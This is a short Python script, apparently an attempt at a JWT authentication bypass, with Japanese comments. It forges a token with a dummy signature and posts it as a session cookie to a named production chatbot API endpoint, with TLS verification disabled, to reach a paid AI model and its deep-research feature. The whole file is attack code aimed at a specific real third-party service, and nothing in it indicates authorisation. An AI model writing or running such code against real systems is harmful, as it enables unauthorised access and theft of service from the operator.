# jwt_auth_bypass_fixed.py
import requests
import json
import os
from datetime import datetime, timedelta
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_expired_jwt():
    header = {"alg": "RS256", "typ": "JWT"}
    now = int((datetime.now() - timedelta(hours=1)).timestamp())
    exp = int((datetime.now() - timedelta(minutes=30)).timestamp())

    payload = {
        # "iss": "explore-iam",
        # "exp": exp,
        # "iat": now,
        "data": {
            # "externalId": "JP-D9HMUFB2JEAT",
            # "cards": [], "cardDetails": [], "widgetDetails": [],
            # "widgetComponentDetails": [], "hiddenWidgetComponents": [],
            # "unlockedWidgetComponents": [], "subCohorts": None,
            # "tokenOnboard": False, "alias": None, "accountInfo": {}
        }
    }

    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    signature = "A" * 342  # ダミー署名
    return f"{header_b64}.{payload_b64}.{signature}"

def test_api_with_jwt(session_jwt, prompt="テスト"):
    url = "https://aistore-api.circles.life/v1/povo/aistore/chatbot/completions"
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session={session_jwt}",
    }

    data = {
        "user_prompt": prompt,
        "feature_id": "ai_apps_chatbox",
        "media_url": "",
        "search_web": True,
        "context_id": "",
        "ai_model": "sonar-pro",
        "conversation_type": "text",
        "deep_research": True,
        "user_time": "02:42:45 PM Asia/Tokyo",
    }

    try:
        resp = requests.post(url, headers=headers, json=data, verify=False, timeout=10)
        print(f"🔑 Status: {resp.status_code}")
        if resp.status_code == 200:
            try:
                print("✅ Response JSON:")
                print(json.dumps(resp.json(), indent=2, ensure_ascii=False))
            except:
                print("⚠️ Raw text response:")
                print(resp.content.decode("utf-8", errors="ignore")[:500])
        return resp.status_code == 200
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

if __name__ == "__main__":
    jwt =create_expired_jwt()
    print("=== 使用したJWT（ダミー） ===")
    print(jwt)
    print("※このJWTはダミー（偽造）です。")

    # JWTのheader/payloadをデコードして表示
    try:
        header_b64, payload_b64, _ = jwt.split('.')
        def b64decode(data):
            data += '=' * (-len(data) % 4)
            return base64.urlsafe_b64decode(data)
        header = json.loads(b64decode(header_b64))
        payload = json.loads(b64decode(payload_b64))
        print("--- JWT Header ---")
        print(json.dumps(header, indent=2, ensure_ascii=False))
        print("--- JWT Payload ---")
        print(json.dumps(payload, indent=2, ensure_ascii=False))
    except Exception as e:
        print(f"JWTデコード失敗: {e}")

    print("🔍 Testing bypass...")
    print("Model: sonar-pro")
    print("Feature: ai_apps_chatbox")
    print("deep_research: True")
    print("質問: 現在時刻は？")
    test_api_with_jwt(jwt, "現在時刻は？")